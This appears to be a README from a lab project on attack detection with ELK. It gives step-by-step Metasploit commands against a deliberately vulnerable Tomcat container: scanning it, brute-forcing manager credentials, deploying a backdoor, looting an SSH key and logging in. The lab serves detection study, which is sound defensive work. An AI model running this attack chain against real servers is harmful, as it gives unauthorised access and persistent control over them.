# Execute Metasploit Attack to Tomcat Server

- Enter inside Metasploit container: 
`docker exec -it metasploit bash`

- Run pre-exploit script to scan target system and identify vulnerabilities:\
`./scripts/check-pre-exploit.sh vulnerable-mts 8080`\
_("vulnerable-mts" arg is the docker address of the target container, "8080" args is the tomcat port to scan)_

![](<https://github.com/enrimon15/attack-detection-elk/blob/main/images/metasploit-preexploit.png>)

- Run first exploit to get tomcat manager dashboard credentials:\
`./msfconsole -r ./scripts/tomcat_mgr_login.rc 8080 vulnerable-mts`\
_("vulnerable-mts" arg is the docker address of the target container, "8080" args is the tomcat port to scan)_

![](<https://github.com/enrimon15/attack-detection-elk/blob/main/images/metasploit_tomcat_mgr_login.png>)

- Run the second exploit to deploy a malicious file in the tomcat server which opens a persistent backdoor on the target system:\
`./msfconsole -r ./scripts/tomcat_deploy_attack.rc 8080 vulnerable-mts tomcat tomcat`\
_("vulnerable-mts" arg is the docker address of the target container, "8080" args is the tomcat port to scan, "tomcat" and "tomcat" are username and password credentials you get ith the previous step)_

![](<https://github.com/enrimon15/attack-detection-elk/blob/main/images/metasploit_tomcat_mgr_deploy.png>)

- Save the ssh-key given in ouput (i.e: "/root/.msf4/loot/20230318162758_default_172.30.0.6_id_rsa_776480.txt")

![](<https://github.com/enrimon15/attack-detection-elk/blob/main/images/metasploit-ssh.png>)

- Run the script to enter target system (ubuntu container):\ 
`./scripts/ssh-connection.sh <key> vulnerable-mts`\
_("vulnerable-mts" arg is the docker address of the target container, <key> args is the ssh key you get with the previous step)_